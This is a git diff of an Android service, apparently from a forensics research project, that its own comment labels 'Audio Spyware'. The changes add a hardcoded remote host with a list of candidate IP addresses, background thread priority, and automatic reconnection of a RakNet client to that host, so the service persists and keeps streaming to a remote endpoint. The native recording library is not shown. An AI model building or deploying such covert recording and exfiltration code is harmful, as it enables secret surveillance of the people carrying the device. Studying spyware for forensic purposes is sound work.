@@ -1,7 +1,10 @@
 package com.forensic.unipg.silenceaudiorecording;
 
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
+import android.net.ConnectivityManager;
+import android.net.NetworkInfo;
 import android.os.Handler;
 import android.os.HandlerThread;
 import android.os.IBinder;
@@ -20,9 +23,25 @@ public class SilenceAudioRecordingService extends Service
         System.load("libSilenceAudioRecordingNative.so");
     }
 
+    //95.250.196.2
+    //169.254.52.94
+    //192.168.2.20
+    //192.168.137.183
+    //192.168.1.132
+
+    private String mHost = "192.168.1.132";
+    private int    mPort = 8000; //not implemented yet
 
     private Looper mServiceLooper;
     private ServiceHandler mServiceHandler;
+
+    //network available
+    private boolean isNetworkAvailable()
+    {
+        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+        NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
+        return activeNetworkInfo != null && activeNetworkInfo.isConnected();
+    }
 
     // Handler that receives messages from the thread
     private final class ServiceHandler extends Handler
@@ -35,7 +54,16 @@ public class SilenceAudioRecordingService extends Service
         @Override
         public void handleMessage(Message msg)
         {
-            //message
+            if(   RakClient.state() != RakClient.C_S_CONNECTED
+               && RakClient.state() != RakClient.C_S_START
+               && isNetworkAvailable()     )
+
+            {
+                //stop
+                RakClient.stop();
+                //re-try to restart
+                RakClient.start(mHost);
+            }
         }
     }
 
@@ -44,23 +72,22 @@ public class SilenceAudioRecordingService extends Service
     {
         super.onCreate();
         // Start up the thread running the service.
-        HandlerThread thread = new HandlerThread("ServiceStartArguments",  Process.THREAD_PRIORITY_AUDIO);
+        HandlerThread thread = new HandlerThread("ServiceStartArguments",  Process.THREAD_PRIORITY_BACKGROUND);
         thread.start();
         // Get the HandlerThread's Looper and use it for our Handler
         mServiceLooper  = thread.getLooper();
         mServiceHandler = new ServiceHandler(mServiceLooper);
         //start RakNet client Audio Spyware
-        RakClient.start();
+        RakClient.start(mHost);
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId)
     {
-        //command
+        //send message
         Message msg = mServiceHandler.obtainMessage();
         msg.arg1 = startId;
         mServiceHandler.sendMessage(msg);
-
         // If we get killed, after returning from here, restart
         return START_STICKY;
     }
